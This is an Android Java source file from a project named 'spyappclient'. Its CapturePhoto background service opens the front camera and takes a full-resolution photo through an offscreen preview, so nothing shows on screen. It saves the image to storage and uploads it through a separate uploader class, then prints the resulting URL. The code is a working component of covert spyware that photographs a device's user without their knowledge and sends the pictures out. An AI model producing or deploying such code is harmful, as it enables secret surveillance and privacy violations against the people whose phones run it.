package com.example.alber.spyappclient;

import android.app.Service;
import android.content.Intent;

import android.graphics.SurfaceTexture;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.hardware.Camera.Size;

import android.view.SurfaceHolder;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;

public class CapturePhoto extends Service {
    private SurfaceHolder sHolder;
    SurfaceTexture surfaceTexture;
    private Camera camera;
    private Parameters parameters;
    PhotoUploader uploader;

    @Override
    public void onCreate(){
        super.onCreate();
        StrictMode.ThreadPolicy policy =
                new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        Thread myThread = null;
    }

    @Override
    public void onStart(Intent intent, int startId){
        synchronized (this) {
            uploader = new PhotoUploader();
            releaseCamera();
            surfaceTexture = new SurfaceTexture(10);
            if (Camera.getNumberOfCameras() >= 2)
                camera = Camera.open(CameraInfo.CAMERA_FACING_FRONT);
            else camera = Camera.open();
            try {
                camera.setPreviewTexture(surfaceTexture);
                parameters = camera.getParameters();
                parameters.set("orientation", "portrait");
                List<Size> sizes = parameters.getSupportedPictureSizes();
                Size mSize = null;
                for (Size size : sizes) {
                    if (mSize == null || mSize.width < size.width)
                        mSize = size;
                }
                parameters.setPictureSize(mSize.width, mSize.height);
                parameters.setRotation(270);
                camera.setParameters(parameters);
                camera.startPreview();
                camera.takePicture(null, null, capture);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    Camera.PictureCallback capture = new Camera.PictureCallback()
    {
        public void onPictureTaken(final byte[] data, Camera camera) {

            FileOutputStream outStream = null;
            try{
                File sd = new File(Environment.getExternalStorageDirectory(), "A");
                if(!sd.exists()) sd.mkdirs();
                Calendar cal = Calendar.getInstance();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String tar = (sdf.format(cal.getTime()));
                outStream = new FileOutputStream(sd+tar+".jpg");
                outStream.write(data);
                outStream.close();
                releaseCamera();
                uploader.upload(new File(sd+tar+".jpg"));
                System.out.println(uploader.getPhotoUrl());
            } catch (FileNotFoundException e){
                e.printStackTrace();
            } catch (IOException e){
                e.printStackTrace();
            }
        }
    };

        @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void releaseCamera() {

        if (null == camera)
            return;
        camera.stopPreview();
        camera.release();
        camera = null;
    }
}
